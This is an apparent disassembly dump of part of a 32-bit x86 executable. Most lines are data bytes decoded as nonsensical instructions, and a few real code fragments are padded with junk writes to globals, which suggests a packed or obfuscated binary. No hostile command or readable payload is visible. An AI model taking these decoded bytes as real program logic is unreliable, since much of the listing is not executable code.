  404844:	and    eax,0x70696f0b
  404849:	add    BYTE PTR [ecx],bh
  40484b:	fisttp QWORD PTR [esi+0x7f652044]
  404851:	pop    DWORD PTR ds:[edx]
  404854:	shl    DWORD PTR [esi-0x22baacfd],cl
  40485a:	mov    BYTE PTR [ecx],0xdb
  40485d:	pop    esp
  40485e:	rcl    DWORD PTR [ecx],1
  404860:	jns    0x404800
  404862:	mov    dh,0x43
  404864:	daa    
  404865:	add    eax,0x12216723
  40486a:	fstp   TBYTE PTR [esi]
  40486c:	dec    edi
  40486d:	loopne 0x40483c
  40486f:	xchg   esp,eax
  404870:	jle    0x404863
  404872:	bound  edx,QWORD PTR [ebx-0x1b38902f]
  404878:	jns    0x404817
  40487a:	xchg   ebp,eax
  40487b:	mov    cl,0x60
  40487d:	mov    dl,0xc0
  40487f:	ret    0xa770
  404882:	jno    0x4048dc
  404884:	test   dl,dl
  404886:	dec    ebx
  404887:	fcomp  DWORD PTR [edx+0x37]
  40488a:	sub    al,0x4d
  40488c:	mov    DWORD PTR [esi],esi
  40488e:	mov    ebx,0xeb43e8af
  404893:	repz aaa 
  404895:	je     0x40488c
  404897:	cmp    ah,BYTE PTR [eax+ebp*8-0x1d]
  40489b:	xchg   dl,ah
  40489d:	push   edi
  40489e:	jmp    0x4b32:0xba812bc4
  4048a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4048a6:	clc    
  4048a7:	jno    0x4048ea
  4048a9:	mov    esi,0x4bc5097f
  4048ae:	or     cl,BYTE PTR [edi-0x42]
  4048b1:	push   ebx
  4048b2:	stc    
  4048b3:	arpl   dx,dx
  4048b5:	mov    eax,ds:0xb5acba29
  4048ba:	push   0xffffffff
  4048bc:	fdiv   DWORD PTR [edx+0x4c4335c5]
  4048c2:	jl     0x40488b
  4048c4:	aas    
  4048c5:	add    eax,0xb1bdba97
  4048ca:	cld    
  4048cb:	cmp    dh,BYTE PTR [edx+esi*1-0x4b3ca618]
  4048d2:	xor    ecx,ecx
  4048d4:	mov    ebp,0x2be792ae
  4048d9:	cmp    ebp,DWORD PTR [ebx]
  4048db:	ret    0x98fb
  4048de:	xor    eax,0xd12a149b
  4048e3:	popf   
  4048e4:	fild   WORD PTR [ecx+0x69]
  4048e7:	lods   al,BYTE PTR ds:[esi]
  4048e8:	icebp  
  4048e9:	(bad)  
  4048eb:	cld    
  4048ec:	stos   BYTE PTR es:[edi],al
  4048ed:	add    dh,BYTE PTR [edx]
  4048ef:	push   0xffffff97
  4048f1:	daa    
  4048f2:	in     eax,0x1f
  4048f4:	loop   0x404912
  4048f6:	cli    
  4048f7:	inc    esi
  4048f8:	aad    0x54
  4048fa:	xchg   DWORD PTR [edi+0x558823c6],esi
  404900:	ins    BYTE PTR es:[edi],dx
  404901:	(bad)  
  404902:	rcr    bh,cl
  404904:	add    DWORD PTR ds:0x6d108c04,edx
  40490a:	stos   BYTE PTR es:[edi],al
  40490b:	mov    eax,ds:0xa92d9ffb
  404910:	imul   esp,DWORD PTR [ebx],0x4559a90e
  404916:	and    DWORD PTR [eax+eax*4],edx
  404919:	dec    ebx
  40491a:	test   al,0xf3
  40491c:	inc    edx
  40491d:	sub    DWORD PTR [edi+0x17],edx
  404920:	jecxz  0x40491b
  404922:	or     al,bl
  404924:	mov    DWORD PTR [ebp-0x24],0xf89c85d8
  40492b:	mov    eax,DWORD PTR [ebp-0xc]
  40492e:	sbb    DWORD PTR ds:0x417e59,0x417e51
  404938:	xor    eax,esi
  40493a:	sub    DWORD PTR ds:0x41abde,0x4235cb
  404944:	jmp    0x404abd
  404949:	fst    QWORD PTR [ebx]
  40494b:	cdq    
  40494c:	loope  0x4049a7
  40494e:	jns    0x4049a5
  404950:	and    eax,esi
  404952:	scas   al,BYTE PTR es:[edi]
  404953:	pop    ss
  404954:	addr16 sbb eax,0xda09b4aa
  40495a:	jg     0x4049da
  40495c:	jle    0x404938
  40495e:	jg     0x4049de
  404960:	jle    0x40496f
  404962:	es pop esp
  404964:	mov    DWORD PTR [ebp+0x4d],ebx
  404967:	mov    eax,0x8ace69ac
  40496c:	je     0x404919
  40496e:	add    al,0x5f
  404970:	fsub   QWORD PTR [edx+0x6]
  404973:	std    
  404974:	(bad)  
  404975:	sub    BYTE PTR [edi+0x1dd856a5],bh
  40497b:	jbe    0x40499e
  40497d:	idiv   DWORD PTR [edx]
  40497f:	jb     0x404919
  404981:	sbb    ebp,DWORD PTR [eax+0x26c6533c]
  404987:	pop    ebx
  404988:	mov    BYTE PTR [ebx+0x68],dh
  40498b:	xchg   ebp,eax
  40498c:	out    0xba,al
  40498e:	je     0x40496a
  404990:	pop    ebx
  404991:	sahf   
  404992:	(bad)  
  404993:	pop    ds
  404994:	cmp    al,0xa9
  404996:	sub    dl,ah
  404998:	loop   0x404977
  40499a:	test   al,0x1e
  40499c:	and    BYTE PTR [eax-0x6f969102],ch
  4049a2:	ficom  WORD PTR [ebx-0x9]
  4049a5:	add    eax,edi
  4049a7:	fstp   QWORD PTR [ebp+0x20]
  4049aa:	pushf  
  4049ab:	dec    edx
  4049ac:	xchg   ecx,eax
  4049ad:	push   edx
  4049ae:	dec    esi
  4049af:	mov    BYTE PTR [esi+0x2],0xcf
  4049b3:	repz cmp DWORD PTR [ebx+0x70],0xbf27b4a8
  4049bb:	pusha  
  4049bc:	enter  0xc5a4,0x80
  4049c0:	jl     0x4049f1
  4049c2:	push   ebp
  4049c3:	addr16 push 0xfffffff7
  4049c6:	mov    bl,cl
  4049c8:	test   BYTE PTR [ebp-0x67e37b98],dl
  4049ce:	loop   0x4049d4
  4049d0:	stc    
  4049d1:	xchg   edx,eax
  4049d2:	ss aas 
  4049d4:	sbb    BYTE PTR [ebx+esi*1+0x590dfef],dh
  4049db:	loopne 0x4049e2
  4049dd:	dec    esi
  4049de:	and    eax,0xff0e179e
  4049e3:	jo     0x404a4b
  4049e5:	push   0x8df67e44
  4049ea:	loopne 0x40498d
  4049ec:	dec    ebp
  4049ed:	pop    ecx
  4049ee:	add    esp,DWORD PTR [esp+ebp*1]
  4049f1:	mov    eax,ds:0x22234c13
  4049f6:	popf   
  4049f7:	stos   BYTE PTR es:[edi],al
  4049f8:	push   esi
  4049f9:	adc    edi,eax
  4049fb:	(bad)  
  4049fc:	inc    ecx
  4049fd:	jns    0x4049ac
  4049ff:	inc    eax
  404a00:	mov    al,0xf
  404a02:	(bad)  
  404a03:	fucomip st,st(3)
  404a05:	xor    al,0x75
  404a07:	add    ebp,DWORD PTR [edx-0x5f]
  404a0a:	jmp    0x404a37
  404a0c:	retf   
  404a0d:	sahf   
  404a0e:	mov    ds:0xa4f3929,eax
  404a13:	test   esi,0x6fc245ed
  404a19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a1a:	push   ebx
  404a1b:	push   ds
  404a1c:	xchg   DWORD PTR ds:0x3a7fa55e,esi
  404a22:	pop    ds
  404a23:	pusha  
  404a24:	in     al,dx
  404a25:	in     al,0x95
  404a27:	data16 in al,dx
  404a29:	jecxz  0x404a43
  404a2b:	mov    bh,0xb4
  404a2d:	imul   ebp,DWORD PTR [ecx+0x44cbabe5],0xffffffa7
  404a34:	mov    cl,0x4f
  404a36:	push   edi
  404a37:	push   edi
  404a38:	jl     0x4049c1
  404a3a:	lds    esp,FWORD PTR [edi]
  404a3c:	repz cmp ebx,ebp
  404a3f:	xlat   BYTE PTR ds:[ebx]
  404a40:	push   0x42
  404a42:	sub    bh,dl
  404a44:	inc    ebp
  404a45:	bound  esi,QWORD PTR [ebp+ebp*2-0x7f786d78]
  404a4c:	adc    DWORD PTR [eax],0x3dfa42ff
  404a52:	jge    0x404a68
  404a54:	and    bl,0x7
  404a57:	jl     0x404a50
  404a59:	add    al,0xfe
  404a5b:	mov    al,0x24
  404a5d:	cli    
  404a5e:	cs push ebx
  404a60:	inc    ecx
  404a61:	adc    edi,ebp
  404a63:	adc    BYTE PTR [edx+eiz*2],0x6c
  404a67:	ins    DWORD PTR es:[edi],dx
  404a68:	jle    0x404abc
  404a6a:	(bad)  
  404a6b:	mov    dl,0x9d
  404a6d:	xchg   ebx,eax
  404a6e:	pop    ecx
  404a6f:	cli    
  404a70:	xor    DWORD PTR [ecx+0x3eec988b],esp
  404a76:	loop   0x404a42
  404a78:	sar    DWORD PTR [eax],0xc8
  404a7b:	call   ecx
  404a7d:	inc    esp
  404a7e:	ja     0x404a07
  404a80:	ror    BYTE PTR [edi+0x44],0xe0
  404a84:	aam    0x9
  404a86:	cmp    BYTE PTR [ecx],0x57
  404a89:	and    ecx,DWORD PTR [edx+ecx*1-0x60]
  404a8d:	cs in  eax,dx
  404a8f:	fidivr DWORD PTR [ebx]
  404a91:	jo     0x404a75
  404a93:	push   ds
  404a94:	mov    ebx,0x1fab54c2
  404a99:	outs   dx,BYTE PTR ds:[esi]
  404a9a:	sub    ch,ah
  404a9c:	cli    
  404a9d:	test   BYTE PTR [edi+0x67],al
  404aa0:	div    dh
  404aa2:	add    esp,DWORD PTR [edi+0x5a]
  404aa5:	push   cs
  404aa6:	inc    edi
  404aa7:	aas    
  404aa8:	arpl   WORD PTR [esi],cx
  404aaa:	cs je  0x404ada
  404aad:	adc    al,0xbe
  404aaf:	js     0x404ab6
  404ab1:	rcr    BYTE PTR [edi+0x62585f3a],cl
  404ab7:	mov    al,bh
  404ab9:	push   ebp
  404aba:	cli    
  404abb:	test   esi,0x4589c703
  404ac1:	call   0x360b7047
  404ac6:	inc    edx
  404ac7:	add    BYTE PTR [eax],al
  404ac9:	add    BYTE PTR [eax],al
  404acb:	add    cl,ch
  404acd:	or     eax,DWORD PTR [eax]
  404acf:	add    BYTE PTR [eax],al
  404ad1:	mov    eax,ds:0x4235cb
  404ad6:	inc    eax
  404ad7:	mov    ds:0x4235cb,eax
  404adc:	cmp    DWORD PTR ds:0x4235cb,0x1e
  404ae3:	jae    0x404b28
  404ae9:	cmp    DWORD PTR ds:0x4235cb,0x6
  404af0:	jne    0x404b01
  404af6:	push   0x41ae97
  404afb:	call   DWORD PTR ds:0x40d1c4
  404b01:	cmp    DWORD PTR ds:0x4235cb,0x5
  404b08:	jne    0x404b19
  404b0e:	mov    eax,ds:0x4235cb
  404b13:	inc    eax
  404b14:	mov    ds:0x4235cb,eax
  404b19:	jmp    0x404ad1
  404b1e:	sub    DWORD PTR ds:0x415111,0xc33
  404b28:	mov    DWORD PTR [ebp-0x1c],0xf89c853f
  404b2f:	mov    BYTE PTR [ebp-0x1],0x57
  404b33:	sub    DWORD PTR ds:0x417e59,edi
  404b39:	mov    eax,DWORD PTR [ebp-0xc]
  404b3c:	xor    eax,esi
  404b3e:	and    DWORD PTR ds:0x415115,0x5145
  404b48:	add    eax,edi
  404b4a:	mov    DWORD PTR [ebp-0x18],eax
  404b4d:	mov    eax,DWORD PTR [ebp-0x24]
  404b50:	xor    eax,esi
  404b52:	adc    DWORD PTR ds:0x41abde,0x3f71
  404b5c:	add    eax,edi
  404b5e:	and    DWORD PTR ds:0x4235cf,0x352e
  404b68:	push   eax
  404b69:	dec    eax
  404b6a:	mov    eax,DWORD PTR [ebp-0x28]
  404b6d:	xor    eax,esi
  404b6f:	and    DWORD PTR ds:0x4235c3,0x41abce
  404b79:	add    eax,edi
  404b7b:	xor    DWORD PTR ds:0x41abda,0x41237c
  404b85:	push   eax
  404b86:	and    DWORD PTR ds:0x4235cf,0x41abe2
  404b90:	mov    eax,DWORD PTR [ebp-0x1c]
  404b93:	jmp    0x404d0c
  404b98:	push   0xffffff9c
  404b9a:	mov    ds:0x7b617853,al
  404b9f:	xchg   ebp,eax
  404ba0:	push   ebx
  404ba1:	mov    DWORD PTR [ecx+0x3f],esp
  404ba4:	dec    eax
  404ba5:	es int 0xe4
  404ba8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ba9:	jl     0x404c29
  404bab:	jle    0x404b87
  404bad:	jg     0x404c2d
  404baf:	jle    0x404bf3
  404bb1:	cs jmp 0x404bb7
  404bb4:	fs fwait
  404bb6:	push   DWORD PTR cs:[esi]
  404bb9:	pop    es
  404bba:	add    al,0x28
  404bbc:	add    eax,0x4803fca9
  404bc1:	bound  esi,QWORD PTR [esi]
  404bc3:	dec    edx
  404bc4:	inc    eax
  404bc5:	cwde   
  404bc6:	mov    ds,WORD PTR [esi+0x29be6d55]
  404bcc:	sysret 
  404bce:	lods   eax,DWORD PTR ds:[esi]
  404bcf:	mul    BYTE PTR [esi+eax*8+0x30d7655]
  404bd6:	sbb    al,0xd4
  404bd8:	jg     0x404be1
  404bda:	das    
  404bdb:	jbe    0x404c4f
  404bdd:	fist   WORD PTR [edi-0x26]
  404be0:	dec    edi
  404be1:	dec    esi
  404be2:	ins    DWORD PTR es:[edi],dx
  404be3:	dec    esp
  404be4:	bound  edi,QWORD PTR [edi]
  404be6:	sbb    DWORD PTR [edi+edi*8],0x47bbfa97
  404bed:	cld    
  404bee:	sti    
  404bef:	call   0x33c6:0x9e6ae29e
  404bf6:	inc    edx
  404bf7:	pusha  
  404bf8:	cmc    
  404bf9:	sahf   
  404bfa:	sub    al,0x76
  404bfc:	pop    edi
  404bfd:	(bad)  
  404bff:	or     esp,DWORD PTR [esi]
  404c01:	aas    
  404c02:	push   esi
  404c03:	cmc    
  404c04:	fnstcw WORD PTR [eax]
  404c06:	push   es
  404c07:	test   eax,0x5205a504
  404c0c:	xor    ecx,DWORD PTR [ecx-0x7b]
  404c0f:	sub    al,0x2b
  404c11:	or     eax,0x61aa6807
  404c16:	push   ds
  404c17:	(bad)  
  404c19:	dec    edx
  404c1a:	adc    ch,BYTE PTR [esi+0x35451552]
  404c20:	lea    edx,[ebx-0x4a6930f3]
  404c26:	int3   
  404c27:	and    BYTE PTR [ecx-0x23038fd6],ah
  404c2d:	mov    ebp,0x89465ab3
  404c32:	outs   dx,DWORD PTR ds:[esi]
  404c33:	js     0x404bbf
  404c35:	shl    BYTE PTR [ebx-0x3dd1d50],1
  404c3b:	pusha  
  404c3c:	ret    0x3009
  404c3f:	cs push cs
  404c41:	xchg   BYTE PTR [ecx-0x7],ah
  404c44:	jne    0x404cc2
  404c46:	xchg   ebp,eax
  404c47:	pop    edx
  404c48:	jb     0x62bf23d6
  404c4e:	rol    DWORD PTR [ebp*4-0xc09a7ff],0x2f
  404c56:	xchg   ecx,eax
  404c57:	in     al,0x26
  404c59:	fs jmp 0x64a1dd5b
  404c5f:	xor    ebp,esp
  404c61:	dec    edi
  404c62:	lea    ecx,[ebx+0x3b20ade2]
  404c68:	sub    dh,0x54
  404c6b:	test   eax,0x5968681a
  404c70:	test   al,0x7d
  404c72:	repnz inc ecx
  404c74:	lods   eax,DWORD PTR ds:[esi]
  404c75:	sub    ebp,esi
  404c77:	out    0xa2,al
  404c79:	cmp    BYTE PTR [esi],0xf1
  404c7c:	pop    ebx
  404c7d:	jno    0x404cc2
  404c7f:	lock push ebx
  404c81:	sbb    ah,BYTE PTR [ecx-0x57676ff7]
  404c87:	repz or DWORD PTR [ecx+0x69],eax
  404c8b:	sbb    al,0x8
  404c8d:	mov    bh,0x6
  404c8f:	sub    DWORD PTR ds:0xb385f996,esp
  404c95:	leave  
  404c96:	nop
  404c97:	xchg   esi,eax
  404c98:	lods   al,BYTE PTR ds:[esi]
  404c99:	or     ebp,DWORD PTR [esi+0x7f]
  404c9c:	xchg   ebx,eax
  404c9d:	fisubr DWORD PTR [ecx-0x24]
  404ca0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ca1:	mov    ch,0x2c
  404ca3:	gs mov bh,0x60
  404ca6:	push   edi
  404ca7:	and    dh,cl
  404ca9:	stc    
  404caa:	iret   
  404cab:	fpatan 
  404cad:	push   0xd2111a3
  404cb2:	jno    0x404cb6
  404cb4:	stos   BYTE PTR es:[edi],al
  404cb5:	loope  0x404c7d
  404cb7:	sbb    dl,BYTE PTR [edi+0x19d24889]
  404cbd:	jl     0x404c73
  404cbf:	sbb    ah,BYTE PTR [eax-0x43bae680]
  404cc5:	xchg   edx,eax
  404cc6:	dec    esi
  404cc7:	push   0x65555714
  404ccc:	ret    0x947e
  404ccf:	push   cs
  404cd0:	xor    ebp,DWORD PTR [esi]
  404cd2:	loope  0x404c67
  404cd4:	ds addr16 enter 0x324c,0xf2
  404cda:	daa    
  404cdb:	loop   0x404c69
  404cdd:	test   eax,0x8aeb17da
  404ce2:	pop    DWORD PTR [eax]
  404ce4:	(bad)  
  404ce6:	add    al,0x40
  404ce8:	push   ds
  404ce9:	sqrtps xmm5,XMMWORD PTR [ecx+ebp*8-0x7c]
  404cee:	sbb    ch,al
  404cf0:	aas    
  404cf1:	jns    0x404c92
  404cf3:	cmc    
  404cf4:	mov    bl,0x46
  404cf6:	lahf   
  404cf7:	test   eax,0x3e9d271b
  404cfc:	jnp    0x404d31
  404cfe:	sbb    al,0x95
  404d00:	mov    ah,0xa2
  404d02:	inc    eax
  404d03:	test   eax,0xbcf42cea
  404d08:	pop    eax
  404d09:	lock dec ecx
  404d0b:	fs xor eax,esi
  404d0e:	neg    DWORD PTR ds:0x415105
  404d14:	add    eax,edi
  404d16:	xor    DWORD PTR ds:0x412364,0x39b1
  404d20:	push   eax
  404d21:	lea    eax,[ebp-0x78]
  404d24:	push   eax
  404d25:	mov    DWORD PTR ds:0x41237c,0x6752
  404d2f:	push   DWORD PTR [ebp-0xc]
  404d32:	sub    DWORD PTR ds:0x415111,0x1b2b
  404d3c:	push   DWORD PTR [ebp-0x14]
  404d3f:	sub    DWORD PTR ds:0x4235c7,0x412364
  404d49:	call   0x409363
  404d4e:	inc    DWORD PTR ds:0x415119
  404d54:	test   eax,eax
  404d56:	mov    DWORD PTR ds:0x4235c7,0x71ec
  404d60:	je     0x404de0
  404d66:	sub    DWORD PTR ds:0x417e59,0x4235db
  404d70:	lea    eax,[ebp-0x78]
  404d73:	neg    DWORD PTR ds:0x4235cf
  404d79:	push   eax
  404d7a:	add    eax,DWORD PTR ds:0x4235db
  404d80:	mov    eax,DWORD PTR [ebp-0x14]
  404d83:	and    DWORD PTR ds:0x417e59,0xd95
  404d8d:	xor    eax,esi
  404d8f:	add    eax,edi
  404d91:	and    DWORD PTR ds:0x417e3d,0x71b6
  404d9b:	push   eax
  404d9c:	mov    eax,DWORD PTR [ebp-0x10]
  404d9f:	add    eax,0xaa
  404da4:	push   eax
  404da5:	and    DWORD PTR ds:0x41abd2,0x17f4
  404daf:	mov    eax,DWORD PTR [ebp-0x10]
  404db2:	sub    DWORD PTR ds:0x417e55,0x41236c
  404dbc:	mov    eax,DWORD PTR [eax+0x198]
  404dc2:	push   DWORD PTR [eax]
  404dc4:	add    DWORD PTR ds:0x417e55,0x417e3d
  404dce:	call   0x40ae4d
  404dd3:	mov    DWORD PTR ds:0x41abd6,0x35a
  404ddd:	mov    DWORD PTR [ebp-0x8],eax
  404de0:	mov    DWORD PTR ds:0x412368,0x764e
  404dea:	cmp    DWORD PTR [ebp-0x8],0x0
  404dee:	not    DWORD PTR ds:0x412364
  404df4:	lea    eax,[ebp+0x4]
  404df7:	mov    DWORD PTR [ebp-0x20],eax
  404dfa:	je     0x405842
  404e00:	lea    eax,[ebp-0x18]
  404e03:	jmp    0x404f7c
  404e08:	ja     0x404d8f
  404e0a:	(bad)  
  404e0b:	je     0x404d9a
  404e0d:	je     0x404d94
  404e0f:	test   DWORD PTR [esi],edi
  404e11:	push   ebx
  404e12:	outs   dx,DWORD PTR ds:[esi]
  404e13:	jne    0x404df6
  404e15:	sub    esp,esp
  404e17:	add    BYTE PTR [edx],al
  404e19:	jb     0x404e99
  404e1b:	jle    0x404df7
  404e1d:	jg     0x404e9d
  404e1f:	jle    0x404e7c
  404e21:	mov    edx,0xfac560c8
  404e26:	pop    edi
  404e27:	jge    0x404e17
  404e29:	popa   
  404e2a:	out    dx,eax
  404e2b:	xor    DWORD PTR [esi+ebp*1-0x7bf6862],0x60
  404e33:	jns    0x404dc7
  404e35:	enter  0xe9a3,0x94
  404e39:	addr16 push ebp
  404e3b:	and    DWORD PTR [eax+0x26],ecx
  404e3e:	mov    ch,0x45
  404e40:	repnz bound edi,QWORD PTR [eax+0x66]
  404e44:	and    eax,0x63a2fb25
  404e49:	jne    0x404e90
  404e4b:	in     eax,dx
  404e4c:	mov    esi,0x865a4448
  404e51:	scas   eax,DWORD PTR es:[edi]
  404e52:	inc    eax
  404e53:	iret   
  404e54:	and    al,0xf0
  404e56:	jp     0x404e2e
  404e58:	mov    dh,0x82
  404e5a:	add    BYTE PTR [eax-0x40],bl
  404e5d:	(bad)  [eax+ecx*1+0x31]
  404e61:	popf   
  404e62:	aas    
  404e63:	jle    0x404dfe
  404e65:	xor    eax,DWORD PTR [edi-0x64]
  404e68:	inc    eax
  404e69:	mov    ebx,0x97e3d711
  404e6e:	icebp  
  404e6f:	enter  0x75e4,0x9
  404e73:	int3   
  404e74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e75:	push   ecx
  404e76:	ins    DWORD PTR es:[edi],dx
  404e77:	add    bl,BYTE PTR [ebx+0x1e]
  404e7a:	pop    edx
  404e7b:	fdivr  DWORD PTR [eax-0x2f]
  404e7e:	in     eax,dx
  404e7f:	push   ebx
  404e80:	dec    esp
  404e81:	adc    BYTE PTR [ebx],0x40
  404e84:	and    eax,0xb982c825
  404e89:	fwait
  404e8a:	call   0xb28:0x1c48b04b
  404e91:	add    ah,cl
  404e93:	dec    edx
  404e94:	retf   
  404e95:	pop    ds
  404e96:	xor    al,0xe1
  404e98:	adc    esi,ebp
  404e9a:	mov    ebx,edx
  404e9c:	test   edi,esp
  404e9e:	jae    0x404e36
  404ea0:	ds cli 
  404ea2:	fiadd  WORD PTR [ecx]
  404ea4:	mov    ebp,DWORD PTR [eax]
  404ea6:	and    eax,DWORD PTR [ebp-0x5e421b06]
  404eac:	jns    0x404eac
  404eae:	pop    ecx
  404eaf:	lock (bad) [esi+0x4f]
  404eb3:	(bad)  
  404eb4:	dec    esp
  404eb5:	adc    edi,ebp
  404eb7:	out    dx,eax
  404eb8:	hlt    
  404eb9:	mov    dl,0xdd
  404ebb:	and    DWORD PTR [eax],ebp
  404ebd:	push   esp
  404ebe:	ins    DWORD PTR es:[edi],dx
  404ebf:	sbb    al,0x7
  404ec1:	cmp    ecx,DWORD PTR [eax-0x7f7ce665]
  404ec7:	push   esp
  404ec8:	and    BYTE PTR [eax-0x3ebe66c5],0x86
  404ecf:	jg     0x404ebc
  404ed1:	push   edx
  404ed2:	dec    ebx
  404ed3:	push   ss
  404ed4:	hlt    
  404ed5:	daa    
  404ed6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404ed7:	lods   eax,DWORD PTR ds:[esi]
  404ed8:	outs   dx,BYTE PTR ds:[esi]
  404ed9:	inc    edx
  404eda:	psadbw mm3,mm3
  404edd:	sub    al,0x75
  404edf:	and    bl,dh
  404ee1:	stos   DWORD PTR es:[edi],eax
  404ee2:	mov    ch,0x6e
  404ee4:	loop   0x404ee0
  404ee6:	loope  0x404e6c
  404ee8:	in     al,0xd
  404eea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404eeb:	rcr    DWORD PTR [esi-0xb],1
  404eee:	retf   
  404eef:	icebp  
  404ef0:	cld    
  404ef1:	xor    BYTE PTR [ebx+0x27350b44],cl
  404ef7:	mov    ds:0x30113b2d,eax
  404efc:	xor    eax,0x1037a662
  404f01:	pop    edx
  404f02:	mov    ?,WORD PTR [ecx]
  404f04:	push   eax
  404f05:	dec    eax
  404f06:	les    edx,FWORD PTR [ebx+ebp*4+0x7e5164f6]
  404f0d:	fucomp st(6)
  404f0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f10:	mov    dl,0xe3
  404f12:	ins    DWORD PTR es:[edi],dx
  404f13:	or     esi,DWORD PTR [eax+0x23c1a2f4]
  404f19:	stos   DWORD PTR es:[edi],eax
  404f1a:	mov    esi,0x5d7944fe
  404f1f:	push   ebp
  404f20:	add    al,0x6
  404f22:	or     BYTE PTR [eax-0x54ce7de4],cl
  404f28:	xlat   BYTE PTR ds:[ebx]
  404f29:	mov    ch,BYTE PTR [esi-0x6864604f]
  404f2f:	jl     0x404eff
  404f31:	test   al,0xe9
  404f33:	adc    al,0x41
  404f35:	ret    0x8356
  404f38:	es fdiv QWORD PTR ss:[eax+0x6]
  404f3d:	(bad)  
  404f3e:	pop    ecx
  404f3f:	lahf   
  404f40:	sub    ebp,DWORD PTR ds:0x29fec82e
  404f46:	sub    edi,DWORD PTR [eax+0x4a384e84]
  404f4c:	(bad)  
  404f4d:	call   0x4f45:0x609f3aae
  404f54:	mov    al,0x76
  404f56:	out    0xe,al
  404f58:	jle    0x404ef1
  404f5a:	cmp    BYTE PTR [eax-0x5],ah
  404f5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f5e:	and    eax,0xcb43b5a3
  404f63:	jmp    0x70fa:0x38129228
  404f6a:	jb     0x404f1f
  404f6c:	out    0xf2,al
  404f6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f6f:	xor    DWORD PTR ds:0x7584bede,esp
  404f75:	sub    eax,0xa36688c4
  404f7a:	cmp    BYTE PTR [edi-0x40da7eb0],ch
  404f80:	xor    eax,0x42
  404f85:	add    BYTE PTR [eax],al
  404f87:	jmp    0x404f97
  404f8c:	mov    eax,ds:0x4235bf
  404f91:	inc    eax
  404f92:	mov    ds:0x4235bf,eax
  404f97:	cmp    DWORD PTR ds:0x4235bf,0x1e
  404f9e:	jae    0x404fc0
  404fa4:	cmp    DWORD PTR ds:0x4235bf,0x22
  404fab:	jne    0x404fba
  404fb1:	push   DWORD PTR [ebp-0x28]
  404fb4:	call   DWORD PTR ds:0x40d298
  404fba:	jmp    0x404f8c
  404fbf:	inc    eax
  404fc0:	mov    eax,DWORD PTR [ebp-0x2c]
  404fc3:	adc    DWORD PTR ds:0x412354,0x412370
  404fcd:	xor    eax,esi
  404fcf:	add    eax,edi
  404fd1:	and    DWORD PTR ds:0x415115,0x3c83
  404fdb:	jmp    0x405154
  404fe0:	adc    al,0x10
  404fe2:	imul   DWORD PTR [edx]
  404fe4:	mov    ebp,DWORD PTR [ecx+0x1f8510a9]
  404fea:	and    DWORD PTR [edx-0x4493af44],esi
  404ff0:	out    dx,al
  404ff1:	jae    0x405071
  404ff3:	jle    0x404fcf
  404ff5:	jg     0x405075
  404ff7:	jle    0x40503f
  404ff9:	ficomp DWORD PTR [esi+0xcfc531b]
  404fff:	inc    ebp
  405000:	jnp    0x405014
  405002:	retf   0x47ea
  405005:	and    esi,edx
  405007:	ins    BYTE PTR es:[edi],dx
  405008:	nop
  405009:	and    al,0x4f
  40500b:	cs enter 0xd709,0x6c
  405010:	dec    edi
  405011:	xchg   edx,eax
  405012:	sub    BYTE PTR [esi],dh
  405014:	pop    ss
  405015:	sahf   
  405016:	dec    bx
  405018:	jno    0x404fc6
  40501a:	pop    edx
  40501b:	lods   al,BYTE PTR ds:[esi]
  40501c:	adc    eax,0xedbbe3cb
  405021:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405022:	ja     0x405088
  405024:	pop    eax
  405025:	fild   WORD PTR [ebx]
  405027:	mov    ebp,0x222d5016
  40502c:	xor    esi,ebp
  40502e:	stos   DWORD PTR es:[edi],eax
  40502f:	and    DWORD PTR [esi-0x2855abbd],esp
  405035:	(bad)  
  405036:	jnp    0x405034
  405038:	aam    0xcd
  40503a:	jle    0x404fe2
  40503c:	pop    edx
  40503d:	fwait
  40503e:	mov    ss,ebp
  405040:	push   edi
  405041:	leave  
  405042:	adc    BYTE PTR [ebx-0x1],0xee
  405046:	sub    bh,BYTE PTR [edi]
  405048:	push   cs
  405049:	add    eax,0xfb5fab1a
  40504e:	xchg   esp,esp
  405050:	push   ds
  405051:	stos   BYTE PTR es:[edi],al
  405052:	add    DWORD PTR [ecx+0x17056aee],0xe5e4d604
  40505c:	inc    ecx
  40505d:	cmp    DWORD PTR [esi-0x72fbc9ed],0x2
  405064:	pop    es
  405065:	and    al,0x8c
  405067:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405068:	lds    ebp,FWORD PTR [edi]
  40506a:	ret    0x4e27
  40506d:	adc    bh,BYTE PTR [esi+0x20]
  405070:	pop    eax
  405071:	lods   al,BYTE PTR gs:[esi]
  405073:	stc    
  405074:	sub    al,0x84
  405076:	imul   ecx,DWORD PTR [ecx],0xffffffef
  405079:	sub    dl,ch
  40507b:	arpl   WORD PTR [esi],cx
  40507d:	and    BYTE PTR [edx],dl
  40507f:	cld    
  405080:	test   eax,0xed4fa7d7
  405085:	stos   DWORD PTR es:[edi],eax
  405086:	call   0x43a1ea7e
  40508b:	into   
  40508c:	test   eax,0x68f65aa5
  405091:	push   ecx
  405092:	xchg   ebp,eax
  405094:	ins    DWORD PTR es:[edi],dx
  405095:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405096:	mov    ecx,DWORD PTR [esi+0x50b2bcd]
  40509c:	lock inc edx
  40509e:	push   es
  40509f:	retf   0x99a3
  4050a2:	pop    DWORD PTR [ecx-0x61]
  4050a5:	jbe    0x4050bf
  4050a7:	xlat   BYTE PTR ds:[ebx]
  4050a8:	ins    BYTE PTR es:[edi],dx
  4050a9:	fisttp DWORD PTR ds:0x2f7f1a2f
  4050af:	sbb    DWORD PTR [esi],esp
  4050b1:	clc    
  4050b2:	not    BYTE PTR [ebp+0x54ae5c4d]
  4050b8:	(bad)  
  4050b9:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  4050bb:	add    esi,DWORD PTR [edx]
  4050bd:	jp     0x4050c6
  4050bf:	adc    esi,DWORD PTR [edi+eax*8+0x4f]
